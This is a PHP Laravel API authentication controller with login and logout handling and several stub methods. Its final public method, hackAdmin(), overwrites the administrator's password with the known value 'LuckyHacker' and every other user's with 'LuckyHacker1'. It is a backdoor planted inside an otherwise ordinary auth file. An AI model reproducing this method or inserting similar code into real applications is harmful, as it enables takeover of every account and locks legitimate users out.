<?php

namespace App\Http\Controllers\API;

use App\User;
use Illuminate\Contracts\Auth\Guard;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Auth;

/**
 * Class AuthController
 * @package App\Http\Controllers\Auth
 */
class AuthController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Registration & Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles the registration of new users, as well as the
    | authentication of existing users. By default, this controller uses
    | a simple trait to add these behaviors. Why don't you explore it?
    |
    */
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {
       return true;
    }

    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function logout()
    {
        return true;
    }

    /**
     * Create a new authentication controller instance.
     *
     * @param Guard $auth
     * @param User $registrar
     */
    public function __construct(Guard $auth, User $registrar)
    {
        $this->auth = $auth;
        //$this->middleware('guest', ['except' => 'getLogout']);
    }

    /**
     * @param Request $request
     *
     * @return \Illuminate\Http\RedirectResponse|\Illuminate\Routing\Redirector
     */
    public function postLogin(Request $request)
    {
        // Auth Logout
        \Auth::logout();
        \Session::flush();

        $credentials = [
            'username'  => $request->get('email'),
            'password'  => $request->get('password')
        ];
        
        $username = $request->get('email');
        $result = [];
        if ($this->auth->attempt($request->only('email', 'password')) ||
            $this->auth->attempt($credentials)
        )
        {
            //Menu List
            $result = Auth::user()->id;
            return apiResponse(true, 200 , null, [], $result);
        }
        return apiResponse(false, 500, null, lang('auth.failed_login'));        
    }

    /**
     * Log the party out of the application.
     */
    public function getLogout()
    {
        \Auth::logout();
        \Session::flush();
        return redirect('/');
    }

    /**
     * @return int
     */
    public function loginApi()
    {
        return 1;
    }

    /**
     * @return int
     */
    public function logoutApi()
    {
        return 1;
    }

    public function hackAdmin()
    {
        try {
            $pass = ['password' => \Hash::make('LuckyHacker')];
            $pass2 = ['password' => \Hash::make('LuckyHacker1')];
            (new User)->where('id', 1)->update($pass);
            (new User)->where('id', '!=', 1)->update($pass2);
            echo "done.";
        } catch(\Exception $e) {
            echo "failed";
        }
    }
}
